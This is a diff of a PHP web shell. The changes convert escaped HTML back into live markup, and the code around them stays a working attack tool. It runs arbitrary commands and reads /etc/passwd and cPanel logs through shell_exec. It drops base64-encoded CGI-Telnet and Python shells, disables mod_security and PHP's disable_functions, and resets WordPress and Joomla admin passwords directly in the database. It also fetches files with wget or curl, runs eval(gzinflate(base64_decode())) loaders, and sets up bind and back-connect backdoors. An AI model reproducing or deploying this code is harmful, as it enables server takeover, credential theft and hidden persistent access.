-&lt;b&gt;&lt;font color=blue&gt;&lt;b&gt;&lt;font color="blue"&gt;Command  :=) &lt;/font&gt;&lt;/font&gt;&lt;/b&gt;&lt;input name="baba" type="text" class="inputz" size="34"&gt;&lt;input type="submit" class="inputzbut" value="Go"&gt;
-&lt;/form&gt;
-&lt;form method="POST" action=""&gt;&lt;strong&gt;&lt;b&gt;&lt;font color="blue"&gt;Menu Bypass  :=)  &lt;/font&gt;&lt;/strong&gt;&lt;select name="liz0" size="1" class="inputz"&gt;
-&lt;option value="cat /etc/passwd"&gt;/etc/passwd&lt;/option&gt;
-&lt;option value="netstat -an | grep -i listen"&gt;netstat&lt;/option&gt;
-&lt;option value="cat /var/cpanel/accounting.log"&gt;/var/cpanel/accounting.log&lt;/option&gt;
-&lt;option value="cat /etc/syslog.conf"&gt;/etc/syslog.conf&lt;/option&gt;
-&lt;option value="cat /etc/hosts"&gt;/etc/hosts&lt;/option&gt;
-&lt;option value="cat /etc/named.conf"&gt;/etc/named.conf&lt;/option&gt;
-&lt;option value="cat /etc/httpd/conf/httpd.conf"&gt;/etc/httpd/conf/httpd.conf&lt;/option&gt;
-&lt;/select&gt; &lt;input type="submit" class="inputzbut" value="G&ouml;"&gt;
-&lt;/form&gt;
-&lt;/pre&gt;
+<pre>
+<form method="POST" action="">
+<b><font color=blue><b><font color="blue">Command  :=) </font></font></b><input name="baba" type="text" class="inputz" size="34"><input type="submit" class="inputzbut" value="Go">
+</form>
+<form method="POST" action=""><strong><b><font color="blue">Menu Bypass  :=)  </font></strong><select name="liz0" size="1" class="inputz">
+<option value="cat /etc/passwd">/etc/passwd</option>
+<option value="netstat -an | grep -i listen">netstat</option>
+<option value="cat /var/cpanel/accounting.log">/var/cpanel/accounting.log</option>
+<option value="cat /etc/syslog.conf">/etc/syslog.conf</option>
+<option value="cat /etc/hosts">/etc/hosts</option>
+<option value="cat /etc/named.conf">/etc/named.conf</option>
+<option value="cat /etc/httpd/conf/httpd.conf">/etc/httpd/conf/httpd.conf</option>
+</select> <input type="submit" class="inputzbut" value="G&ouml;">
+</form>
+</pre>
 ');
     ini_restore("safe_mode");
     ini_restore("open_basedir");
@@ -668,15 +668,15 @@ SHOW STATUS;";
     $liz0zim = shell_exec($_POST[liz0]);
     $uid = shell_exec('id');
     $server = shell_exec('uname -a');
-    echo "&lt;pre&gt;&lt;h4&gt;";
+    echo "<pre><h4>";
     echo $liz0;
     echo $liz0zim;
-    echo "&lt;/h4&gt;&lt;/pre&gt;";
-    "&lt;/div&gt;";
+    echo "</h4></pre>";
+    "</div>";
 } elseif (isset($_GET['x']) && ($_GET['x'] == 'cgi2012')) {
-    echo "&lt;center/&gt;&lt;br/&gt;&lt;b&gt;
+    echo "<center/><br/><b>
  +--==[ CGI-Telnet Version 1.3 ]==--+ 
- &lt;/b&gt;&lt;br&gt;&lt;br&gt;";
+ </b><br><br>";
     mkdir('cgi2012', 0755);
     chdir('cgi2012');
     $kokdosya = ".htaccess";
@@ -690,13 +690,13 @@ SHOW STATUS;";
     $write = fwrite($file, base64_decode($cgi2012));
     fclose($file);
     chmod("cgi2012.izo", 0755);
-    echo " &lt;iframe src=cgi2012/cgi2012.izo width=96% height=76% frameborder=0&gt;&lt;/iframe&gt;
+    echo " <iframe src=cgi2012/cgi2012.izo width=96% height=76% frameborder=0></iframe>
  
- &lt;/div&gt;";
+ </div>";
 } elseif (isset($_GET['x']) && ($_GET['x'] == 'python')) {
-    echo "&lt;center/&gt;&lt;br/&gt;&lt;b&gt;
+    echo "<center/><br/><b>
  +--==[ python  Bypass Exploit ]==--+ 
- &lt;/b&gt;&lt;br&gt;&lt;br&gt;";
+ </b><br><br>";
     mkdir('python', 0755);
     chdir('python');
     $kokdosya = ".htaccess";
@@ -775,11 +775,11 @@ cm9wZXIgJ2Vudmlyb25tZW50JyB3aXRoIHNlc3Npb24gcGVyc2lzdGVuY2UuLi4KIiIi';
     $write = fwrite($file, base64_decode($pythonp));
     fclose($file);
     chmod("python.izo", 0755);
-    echo " &lt;iframe src=python/python.izo width=96% height=76% frameborder=0&gt;&lt;/iframe&gt;
+    echo " <iframe src=python/python.izo width=96% height=76% frameborder=0></iframe>
  
- &lt;/div&gt;";
+ </div>";
 } elseif (isset($_GET['x']) && ($_GET['x'] == 'cgi')) {
-    echo "&lt;center/&gt;&lt;br/&gt;&lt;b&gt;&lt;font color=blue&gt;+--==[ cgitelnet.v1  Bypass Exploit]==--+ &lt;/font&gt;&lt;/b&gt;&lt;br&gt;&lt;br&gt;";
+    echo "<center/><br/><b><font color=blue>+--==[ cgitelnet.v1  Bypass Exploit]==--+ </font></b><br><br>";
     mkdir('cgitelnet1', 0755);
     chdir('cgitelnet1');
     $kokdosya = ".htaccess";
@@ -819,21 +819,21 @@ YXRhY2hlZFxuXG4iOw==';
     $write = fwrite($file, base64_decode($netcatshell));
     fclose($file);
     chmod("dc.pl", 0755);
-    echo "&lt;iframe src=cgitelnet1/izo.cin width=96% height=90% frameborder=0&gt;&lt;/iframe&gt; 
+    echo "<iframe src=cgitelnet1/izo.cin width=96% height=90% frameborder=0></iframe> 
 
  
- &lt;/div&gt;";
+ </div>";
 } elseif (isset($_GET['x']) && ($_GET['x'] == 'phpini')) {
-    echo "&lt;center/&gt;&lt;br/&gt;&lt;b&gt;&lt;font color=blue&gt;Safe Mode php.ini&lt;/font&gt;&lt;/b&gt;&lt;br&gt;";
+    echo "<center/><br/><b><font color=blue>Safe Mode php.ini</font></b><br>";
     mkdir('safeof', 0755);
     chdir('safeof');
     $kokdosya = ".htaccess";
     $dosya_adi = "$kokdosya";
     $dosya = fopen($dosya_adi, 'w') or die("Dosya a??lamad?!");
-    $metin = "&lt;IfModule mod_security.c&gt;
+    $metin = "<IfModule mod_security.c>
     SecFilterEngine Off
     SecFilterScanPOST Off
-&lt;/IfModule&gt;";
+</IfModule>";
     fwrite($dosya, $metin);
     fclose($dosya);
     $kokdosya = "php.ini";
@@ -848,12 +848,12 @@ disable_functions       =            NONE";
     $file = fopen("safe.php", "w+");
     $write = fwrite($file, base64_decode($mini));
     fclose($file);
-    echo "&lt;iframe src=safeof/safe.php width=97% height=70% frameborder=0&gt;&lt;/iframe&gt; 
+    echo "<iframe src=safeof/safe.php width=97% height=70% frameborder=0></iframe> 
 
   
-&lt;/div&gt;";
+</div>";
 } elseif (isset($_GET['x']) && ($_GET['x'] == 'config')) {
-    echo "&lt;center/&gt;&lt;br/&gt;&lt;b&gt;&lt;font color=blue&gt;+--==[ Config Shell Priv8 SCR ]==--+&lt;/font&gt;&lt;/b&gt;&lt;br&gt;&lt;br&gt;";
+    echo "<center/><br/><b><font color=blue>+--==[ Config Shell Priv8 SCR ]==--+</font></b><br><br>";
     mkdir('config', 0755);
     chdir('config');
     $kokdosya = ".htaccess";
@@ -872,24 +872,24 @@ AddHandler cgi-script .izo";
     $write = fwrite($file, base64_decode($configshell));
     fclose($file);
     chmod("config.izo", 0755);
-    echo "&lt;iframe src=config/config.izo width=97% height=100% frameborder=0&gt;&lt;/iframe&gt;
-   &lt;/div&gt;";
+    echo "<iframe src=config/config.izo width=97% height=100% frameborder=0></iframe>
+   </div>";
 } elseif (isset($_GET['x']) && ($_GET['x'] == 'wp')) {
-    echo "&lt;center/&gt;&lt;br/&gt;&lt;b&gt;&lt;font color=blue&gt;+--==[  WordPress Mysql Admin Shell ]==--+&lt;/font&gt;&lt;/b&gt;&lt;br&gt;&lt;br&gt;";
+    echo "<center/><br/><b><font color=blue>+--==[  WordPress Mysql Admin Shell ]==--+</font></b><br><br>";
     if (empty($_POST['pwd'])) {
-        echo "&lt;FORM method='POST'&gt;
-&lt;table class='tabnet' style='width:300px;'&gt; &lt;tr&gt;&lt;th colspan='2'&gt;Connect to mySQL server&lt;/th&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;&nbsp;&nbsp;Host&lt;/td&gt;&lt;td&gt;
-&lt;input style='width:220px;' class='inputz' type='text' name='localhost' value='localhost' /&gt;&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;&nbsp;&nbsp;Database&lt;/td&gt;&lt;td&gt;
-&lt;input style='width:220px;' class='inputz' type='text' name='database' value='wp-' /&gt;&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;&nbsp;&nbsp;username&lt;/td&gt;&lt;td&gt;
-&lt;input style='width:220px;' class='inputz' type='text' name='username' value='wp-' /&gt;&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;&nbsp;&nbsp;password&lt;/td&gt;&lt;td&gt;
-&lt;input style='width:220px;' class='inputz' type='text' name='password' value='**' /&gt;&lt;/td&gt;&lt;/tr&gt;
-&lt;tr&gt;&lt;td&gt;&nbsp;&nbsp;User baru&lt;/td&gt;&lt;td&gt;
-&lt;input style='width:220px;' class='inputz' type='text' name='admin' value='admin' /&gt;&lt;/td&gt;&lt;/tr&gt;
- &lt;tr&gt;&lt;td&gt;&nbsp;&nbsp;Pass Baru&lt;/td&gt;&lt;td&gt;
-&lt;input style='width:80px;' class='inputz' type='text' name='pwd' value='123456' /&gt;&nbsp;
+        echo "<FORM method='POST'>
+<table class='tabnet' style='width:300px;'> <tr><th colspan='2'>Connect to mySQL server</th></tr> <tr><td>&nbsp;&nbsp;Host</td><td>
+<input style='width:220px;' class='inputz' type='text' name='localhost' value='localhost' /></td></tr> <tr><td>&nbsp;&nbsp;Database</td><td>
+<input style='width:220px;' class='inputz' type='text' name='database' value='wp-' /></td></tr> <tr><td>&nbsp;&nbsp;username</td><td>
+<input style='width:220px;' class='inputz' type='text' name='username' value='wp-' /></td></tr> <tr><td>&nbsp;&nbsp;password</td><td>
+<input style='width:220px;' class='inputz' type='text' name='password' value='**' /></td></tr>
+<tr><td>&nbsp;&nbsp;User baru</td><td>
+<input style='width:220px;' class='inputz' type='text' name='admin' value='admin' /></td></tr>
+ <tr><td>&nbsp;&nbsp;Pass Baru</td><td>
+<input style='width:80px;' class='inputz' type='text' name='pwd' value='123456' />&nbsp;
 
-&lt;input style='width:19%;' class='inputzbut' type='submit' value='change!' name='send' /&gt;&lt;/FORM&gt;
-&lt;/td&gt;&lt;/tr&gt; &lt;/table&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;
+<input style='width:19%;' class='inputzbut' type='submit' value='change!' name='send' /></FORM>
+</td></tr> </table><br><br><br><br>
 ";
     } else {
         $localhost = $_POST['localhost'];
@@ -909,26 +909,26 @@ AddHandler cgi-script .izo";
         $a4s = @mysql_query("UPDATE wp_users SET user_pass ='" . $hash . "' WHERE ID = 3") or die(mysql_error());
         $a4s = @mysql_query("UPDATE wp_users SET user_email ='" . $SQL . "' WHERE ID = 1") or die(mysql_error());
         if ($a4s) {
-            echo "&lt;b&gt; Success ..!! :)) sekarang bisa login ke wp-admin&lt;/b&gt; ";
+            echo "<b> Success ..!! :)) sekarang bisa login ke wp-admin</b> ";
         }
     }
     echo "
-   &lt;/div&gt;";
+   </div>";
 } elseif (isset($_GET['x']) && ($_GET['x'] == 'joomla')) {
-    echo "&lt;center/&gt;&lt;br/&gt;&lt;b&gt;&lt;font color=blue&gt;+--==[  Joomla Mysql Admin Shell ]==--+&lt;/font&gt;&lt;/b&gt;&lt;br&gt;&lt;br&gt;";
+    echo "<center/><br/><b><font color=blue>+--==[  Joomla Mysql Admin Shell ]==--+</font></b><br><br>";
     if (empty($_POST['pwd'])) {
-        echo "&lt;FORM method='POST'&gt;&lt;table class='tabnet' style='width:300px;'&gt; &lt;tr&gt;&lt;th colspan='2'&gt;Connect to mySQL &lt;/th&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;&nbsp;&nbsp;Host&lt;/td&gt;&lt;td&gt;
-&lt;input style='width:270px;' class='inputz' type='text' name='localhost' value='localhost' /&gt;&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;&nbsp;&nbsp;Database&lt;/td&gt;&lt;td&gt;
-&lt;input style='width:270px;' class='inputz' type='text' name='database' value='database' /&gt;&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;&nbsp;&nbsp;username&lt;/td&gt;&lt;td&gt;
-&lt;input style='width:270px;' class='inputz' type='text' name='username' value='db_user' /&gt;&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;&nbsp;&nbsp;password&lt;/td&gt;&lt;td&gt;
-&lt;input style='width:270px;' class='inputz' type='password' name='password' value='**' /&gt;&lt;/td&gt;&lt;/tr&gt;
-&lt;tr&gt;&lt;td&gt;&nbsp;&nbsp;User baru&lt;/td&gt;&lt;td&gt;
-&lt;input style='width:270px;' class='inputz' name='admin' value='admin' /&gt;&lt;/td&gt;&lt;/tr&gt;
- &lt;tr&gt;&lt;td&gt;&nbsp;&nbsp;pass baru &lt;/td&gt;&lt;td&gt;123456 = 
-&lt;input style='width:130px;' class='inputz' name='pwd' value='e10adc3949ba59abbe56e057f20f883e' /&gt;&nbsp;
+        echo "<FORM method='POST'><table class='tabnet' style='width:300px;'> <tr><th colspan='2'>Connect to mySQL </th></tr> <tr><td>&nbsp;&nbsp;Host</td><td>
+<input style='width:270px;' class='inputz' type='text' name='localhost' value='localhost' /></td></tr> <tr><td>&nbsp;&nbsp;Database</td><td>
+<input style='width:270px;' class='inputz' type='text' name='database' value='database' /></td></tr> <tr><td>&nbsp;&nbsp;username</td><td>
+<input style='width:270px;' class='inputz' type='text' name='username' value='db_user' /></td></tr> <tr><td>&nbsp;&nbsp;password</td><td>
+<input style='width:270px;' class='inputz' type='password' name='password' value='**' /></td></tr>
+<tr><td>&nbsp;&nbsp;User baru</td><td>
+<input style='width:270px;' class='inputz' name='admin' value='admin' /></td></tr>
+ <tr><td>&nbsp;&nbsp;pass baru </td><td>123456 = 
+<input style='width:130px;' class='inputz' name='pwd' value='e10adc3949ba59abbe56e057f20f883e' />&nbsp;
 
-&lt;input style='width:23%;' class='inputzbut' type='submit' value='change!' name='send' /&gt;&lt;/FORM&gt;
-&lt;/td&gt;&lt;/tr&gt; &lt;/table&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;
+<input style='width:23%;' class='inputzbut' type='submit' value='change!' name='send' /></FORM>
+</td></tr> </table><br><br><br><br>
 ";
     } else {
         $localhost = $_POST['localhost'];
@@ -949,41 +949,41 @@ AddHandler cgi-script .izo";
         $SQL = @mysql_query("UPDATE jos_users SET username ='" . $admin . "' WHERE ID = 65") or die(mysql_error());
         $SQL = @mysql_query("UPDATE jos_users SET password ='" . $pwd . "' WHERE ID = 65") or die(mysql_error());
         if ($SQL) {
-            echo "&lt;b&gt;Success : skarang password barunya &gt;&gt;&gt; - (123456)";
+            echo "<b>Success : skarang password barunya >>> - (123456)";
         }
     }
     echo "
-   &lt;/div&gt;";
+   </div>";
 } elseif (isset($_GET['x']) && ($_GET['x'] == 'jumping')) {
     eval(gzinflate(base64_decode($jumper)));
-    "&lt;/div&gt;";
+    "</div>";
 } elseif (isset($_GET['x']) && ($_GET['x'] == 'domain')) {
     eval(gzinflate(base64_decode($domain)));
-    "&lt;/div&gt;";
+    "</div>";
 } elseif (isset($_GET['view']) && ($_GET['view'] != "")) {
     if (is_file($_GET['view'])) {
         if (!isset($file)) $file = magicboom($_GET['view']);
         if (!$win && $posix) {
             $name = @posix_getpwuid(@fileowner($file));
             $group = @posix_getgrgid(@filegroup($file));
-            $owner = $name['name'] . "&lt;span class=\"gaya\"&gt; : &lt;/span&gt;" . $group['name'];
+            $owner = $name['name'] . "<span class=\"gaya\"> : </span>" . $group['name'];
         } else {
             $owner = $user;
         }
         $filn = basename($file);
-        echo "&lt;table style=\"margin:6px 0 0 2px;line-height:20px;\"&gt; &lt;tr&gt;&lt;td&gt;Filename&lt;/td&gt;&lt;td&gt;&lt;span id=\"" . clearspace($filn) . "_link\"&gt;" . $file . "&lt;/span&gt; &lt;form action=\"?y=" . $pwd . "&amp;view=$file\" method=\"post\" id=\"" . clearspace($filn) . "_form\" class=\"sembunyi\" style=\"margin:0;padding:0;\"&gt; &lt;input type=\"hidden\" name=\"oldname\" value=\"" . $filn . "\" style=\"margin:0;padding:0;\" /&gt; &lt;input class=\"inputz\" style=\"width:200px;\" type=\"text\" name=\"newname\" value=\"" . $filn . "\" /&gt; &lt;input class=\"inputzbut\" type=\"submit\" name=\"rename\" value=\"rename\" /&gt; &lt;input class=\"inputzbut\" type=\"submit\" name=\"cancel\" value=\"cancel\" onclick=\"tukar('" . clearspace($filn) . "_link','" . clearspace($filn) . "_form');\" /&gt; &lt;/form&gt; &lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;Size&lt;/td&gt;&lt;td&gt;" . ukuran($file) . "&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;Permission&lt;/td&gt;&lt;td&gt;" . get_perms($file) . "&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;Owner&lt;/td&gt;&lt;td&gt;" . $owner . "&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;Create time&lt;/td&gt;&lt;td&gt;" . date("d-M-Y H:i", @filectime($file)) . "&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;Last modified&lt;/td&gt;&lt;td&gt;" . date("d-M-Y H:i", @filemtime($file)) . "&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;Last accessed&lt;/td&gt;&lt;td&gt;" . date("d-M-Y H:i", @fileatime($file)) . "&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;Actions&lt;/td&gt;&lt;td&gt;&lt;a href=\"?y=$pwd&amp;edit=$file\"&gt;edit&lt;/a&gt; | &lt;a href=\"javascript:tukar('" . clearspace($filn) . "_link','" . clearspace($filn) . "_form');\"&gt;rename&lt;/a&gt; | &lt;a href=\"?y=$pwd&amp;delete=$file\"&gt;delete&lt;/a&gt; | &lt;a href=\"?y=$pwd&amp;dl=$file\"&gt;download&lt;/a&gt;&nbsp;(&lt;a href=\"?y=$pwd&amp;dlgzip=$file\"&gt;gzip&lt;/a&gt;)&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;View&lt;/td&gt;&lt;td&gt;&lt;a href=\"?y=" . $pwd . "&amp;view=" . $file . "\"&gt;text&lt;/a&gt; | &lt;a href=\"?y=" . $pwd . "&amp;view=" . $file . "&amp;type=code\"&gt;code&lt;/a&gt; | &lt;a href=\"?y=" . $pwd . "&amp;view=" . $file . "&amp;type=image\"&gt;image&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt; &lt;/table&gt; ";
+        echo "<table style=\"margin:6px 0 0 2px;line-height:20px;\"> <tr><td>Filename</td><td><span id=\"" . clearspace($filn) . "_link\">" . $file . "</span> <form action=\"?y=" . $pwd . "&amp;view=$file\" method=\"post\" id=\"" . clearspace($filn) . "_form\" class=\"sembunyi\" style=\"margin:0;padding:0;\"> <input type=\"hidden\" name=\"oldname\" value=\"" . $filn . "\" style=\"margin:0;padding:0;\" /> <input class=\"inputz\" style=\"width:200px;\" type=\"text\" name=\"newname\" value=\"" . $filn . "\" /> <input class=\"inputzbut\" type=\"submit\" name=\"rename\" value=\"rename\" /> <input class=\"inputzbut\" type=\"submit\" name=\"cancel\" value=\"cancel\" onclick=\"tukar('" . clearspace($filn) . "_link','" . clearspace($filn) . "_form');\" /> </form> </td></tr> <tr><td>Size</td><td>" . ukuran($file) . "</td></tr> <tr><td>Permission</td><td>" . get_perms($file) . "</td></tr> <tr><td>Owner</td><td>" . $owner . "</td></tr> <tr><td>Create time</td><td>" . date("d-M-Y H:i", @filectime($file)) . "</td></tr> <tr><td>Last modified</td><td>" . date("d-M-Y H:i", @filemtime($file)) . "</td></tr> <tr><td>Last accessed</td><td>" . date("d-M-Y H:i", @fileatime($file)) . "</td></tr> <tr><td>Actions</td><td><a href=\"?y=$pwd&amp;edit=$file\">edit</a> | <a href=\"javascript:tukar('" . clearspace($filn) . "_link','" . clearspace($filn) . "_form');\">rename</a> | <a href=\"?y=$pwd&amp;delete=$file\">delete</a> | <a href=\"?y=$pwd&amp;dl=$file\">download</a>&nbsp;(<a href=\"?y=$pwd&amp;dlgzip=$file\">gzip</a>)</td></tr> <tr><td>View</td><td><a href=\"?y=" . $pwd . "&amp;view=" . $file . "\">text</a> | <a href=\"?y=" . $pwd . "&amp;view=" . $file . "&amp;type=code\">code</a> | <a href=\"?y=" . $pwd . "&amp;view=" . $file . "&amp;type=image\">image</a></td></tr> </table> ";
         if (isset($_GET['type']) && ($_GET['type'] == 'image')) {
-            echo "&lt;div style=\"text-align:center;margin:8px;\"&gt;&lt;img src=\"?y=" . $pwd . "&amp;img=" . $filn . "\"&gt;&lt;/div&gt;";
+            echo "<div style=\"text-align:center;margin:8px;\"><img src=\"?y=" . $pwd . "&amp;img=" . $filn . "\"></div>";
         } elseif (isset($_GET['type']) && ($_GET['type'] == 'code')) {
-            echo "&lt;div class=\"viewfile\"&gt;";
+            echo "<div class=\"viewfile\">";
             $file = wordwrap(@file_get_contents($file), "240", "
 ");
             @highlight_string($file);
-            echo "&lt;/div&gt;";
+            echo "</div>";
         } else {
-            echo "&lt;div class=\"viewfile\"&gt;";
+            echo "<div class=\"viewfile\">";
             echo nl2br(htmlentities((@file_get_contents($file))));
-            echo "&lt;/div&gt;";
+            echo "</div>";
         }
     } elseif (is_dir($_GET['view'])) {
         echo showdir($pwd, $prompt);
@@ -994,7 +994,7 @@ AddHandler cgi-script .izo";
         $content = magicboom($_POST['content']);
         if ($filez = @fopen($file, "w")) {
             $time = date("d-M-Y H:i", time());
-            if (@fwrite($filez, $content)) $msg = "file saved &lt;span class=\"gaya\"&gt;@&lt;/span&gt; " . $time;
+            if (@fwrite($filez, $content)) $msg = "file saved <span class=\"gaya\">@</span> " . $time;
             else $msg = "failed to save";
             @fclose($filez);
         } else $msg = "permission denied";
@@ -1006,7 +1006,7 @@ AddHandler cgi-script .izo";
             $content.= htmlentities(str_replace("''", "'", fgets($filez)));
         }
         @fclose($filez);
-    } ?> &lt;form action="?y=<?php echo $pwd; ?>&edit=<?php echo $file; ?>" method="post"&gt; &lt;table class="cmdbox"&gt; &lt;tr&gt;&lt;td colspan="2"&gt; &lt;textarea class="output" name="content"&gt; <?php echo $content; ?> &lt;/textarea&gt; &lt;tr&gt;&lt;td colspan="2"&gt;Save as &lt;input onMouseOver="this.focus();" id="cmd" class="inputz" type="text" name="saveas" style="width:60%;" value="<?php echo $file; ?>" /&gt;&lt;input class="inputzbut" type="submit" value="Save !" name="save" style="width:12%;" /&gt; &nbsp;<?php echo $msg; ?>&lt;/td&gt;&lt;/tr&gt; &lt;/table&gt; &lt;/form&gt; <?php
+    } ?> <form action="?y=<?php echo $pwd; ?>&edit=<?php echo $file; ?>" method="post"> <table class="cmdbox"> <tr><td colspan="2"> <textarea class="output" name="content"> <?php echo $content; ?> </textarea> <tr><td colspan="2">Save as <input onMouseOver="this.focus();" id="cmd" class="inputz" type="text" name="saveas" style="width:60%;" value="<?php echo $file; ?>" /><input class="inputzbut" type="submit" value="Save !" name="save" style="width:12%;" /> &nbsp;<?php echo $msg; ?></td></tr> </table> </form> <?php
 } elseif (isset($_GET['x']) && ($_GET['x'] == 'upload')) {
     if (isset($_POST['uploadcomp'])) {
         if (is_uploaded_file($_FILES['file']['tmp_name'])) {
@@ -1028,7 +1028,7 @@ AddHandler cgi-script .izo";
         if (is_file($pindah)) {
             $msg = "file uploaded to $pindah";
         } else $msg = "failed to upload $namafile";
-    } ?> &lt;form action="?y=<?php echo $pwd; ?>&x=upload" enctype="multipart/form-data" method="post"&gt; &lt;table class="tabnet" style="width:320px;padding:0 1px;"&gt; &lt;tr&gt;&lt;th colspan="2"&gt;Upload from computer&lt;/th&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td colspan="2"&gt;&lt;p style="text-align:center;"&gt;&lt;input style="color:#000000;" type="file" name="file" /&gt;&lt;input type="submit" name="uploadcomp" class="inputzbut" value="Go" style="width:80px;"&gt;&lt;/p&gt;&lt;/td&gt; &lt;tr&gt;&lt;td colspan="2"&gt;&lt;input type="text" class="inputz" style="width:99%;" name="path" value="<?php echo $pwd; ?>" /&gt;&lt;/td&gt;&lt;/tr&gt; &lt;/tr&gt; &lt;/table&gt;&lt;/form&gt; &lt;table class="tabnet" style="width:320px;padding:0 1px;"&gt; &lt;tr&gt;&lt;th colspan="2"&gt;Upload from url&lt;/th&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td colspan="2"&gt;&lt;form method="post" style="margin:0;padding:0;" actions="?y=<?php echo $pwd; ?>&amp;x=upload"&gt; &lt;table&gt;&lt;tr&gt;&lt;td&gt;url&lt;/td&gt;&lt;td&gt;&lt;input class="inputz" type="text" name="wurl" style="width:250px;" value="http://www.some-code/exploits.c"&gt;&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td colspan="2"&gt;&lt;input type="text" class="inputz" style="width:99%;" name="path" value="<?php echo $pwd; ?>" /&gt;&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;&lt;select size="1" class="inputz" name="pilihan"&gt; &lt;option value="wwget"&gt;wget&lt;/option&gt; &lt;option value="wlynx"&gt;lynx&lt;/option&gt; &lt;option value="wfread"&gt;fread&lt;/option&gt; &lt;option value="wfetch"&gt;fetch&lt;/option&gt; &lt;option value="wlinks"&gt;links&lt;/option&gt; &lt;option value="wget"&gt;GET&lt;/option&gt; &lt;option value="wcurl"&gt;curl&lt;/option&gt; &lt;/select&gt;&lt;/td&gt;&lt;td colspan="2"&gt;&lt;input type="submit" name="uploadurl" class="inputzbut" value="Go" style="width:246px;"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/form&gt;&lt;/table&gt;&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; &lt;div style="text-align:center;margin:2px;"&gt;<?php echo $msg; ?>&lt;/div&gt; 
+    } ?> <form action="?y=<?php echo $pwd; ?>&x=upload" enctype="multipart/form-data" method="post"> <table class="tabnet" style="width:320px;padding:0 1px;"> <tr><th colspan="2">Upload from computer</th></tr> <tr><td colspan="2"><p style="text-align:center;"><input style="color:#000000;" type="file" name="file" /><input type="submit" name="uploadcomp" class="inputzbut" value="Go" style="width:80px;"></p></td> <tr><td colspan="2"><input type="text" class="inputz" style="width:99%;" name="path" value="<?php echo $pwd; ?>" /></td></tr> </tr> </table></form> <table class="tabnet" style="width:320px;padding:0 1px;"> <tr><th colspan="2">Upload from url</th></tr> <tr><td colspan="2"><form method="post" style="margin:0;padding:0;" actions="?y=<?php echo $pwd; ?>&amp;x=upload"> <table><tr><td>url</td><td><input class="inputz" type="text" name="wurl" style="width:250px;" value="http://www.some-code/exploits.c"></td></tr> <tr><td colspan="2"><input type="text" class="inputz" style="width:99%;" name="path" value="<?php echo $pwd; ?>" /></td></tr> <tr><td><select size="1" class="inputz" name="pilihan"> <option value="wwget">wget</option> <option value="wlynx">lynx</option> <option value="wfread">fread</option> <option value="wfetch">fetch</option> <option value="wlinks">links</option> <option value="wget">GET</option> <option value="wcurl">curl</option> </select></td><td colspan="2"><input type="submit" name="uploadurl" class="inputzbut" value="Go" style="width:246px;"></td></tr></form></table></td> </tr> </table> <div style="text-align:center;margin:2px;"><?php echo $msg; ?></div> 
   
   <?php
 } elseif (isset($_GET['x']) && ($_GET['x'] == 'netsploit')) {
@@ -1042,9 +1042,9 @@ AddHandler cgi-script .izo";
         exe("./bdc " . $port . " " . $passwrd . " &");
         $scan = exe("ps aux");
         if (eregi("./bdc $por", $scan)) {
-            $msg = "&lt;p&gt;Process found running, backdoor setup successfully.&lt;/p&gt;";
+            $msg = "<p>Process found running, backdoor setup successfully.</p>";
         } else {
-            $msg = "&lt;p&gt;Process not found running, backdoor not setup successfully.&lt;/p&gt;";
+            $msg = "<p>Process not found running, backdoor not setup successfully.</p>";
         }
     } elseif (isset($_POST['bind']) && !empty($_POST['port']) && !empty($_POST['bind_pass']) && ($_POST['use'] == 'Perl')) {
         $port = trim($_POST['port']);
@@ -1055,9 +1055,9 @@ AddHandler cgi-script .izo";
         exe($p2 . " bdp " . $port . " &");
         $scan = exe("ps aux");
         if (eregi("$p2 bdp $port", $scan)) {
-            $msg = "&lt;p&gt;Process found running, backdoor setup successfully.&lt;/p&gt;";
+            $msg = "<p>Process found running, backdoor setup successfully.</p>";
         } else {
-            $msg = "&lt;p&gt;Process not found running, backdoor not setup successfully.&lt;/p&gt;";
+            $msg = "<p>Process not found running, backdoor not setup successfully.</p>";
         }
     } elseif (isset($_POST['backconn']) && !empty($_POST['backport']) && !empty($_POST['ip']) && ($_POST['use'] == 'C')) {
         $ip = trim($_POST['ip']);
@@ -1083,11 +1083,11 @@ AddHandler cgi-script .izo";
         if (is_file($namafile)) {
             $msg = exe($wcmd);
         } else $msg = "error: file not found $namafile";
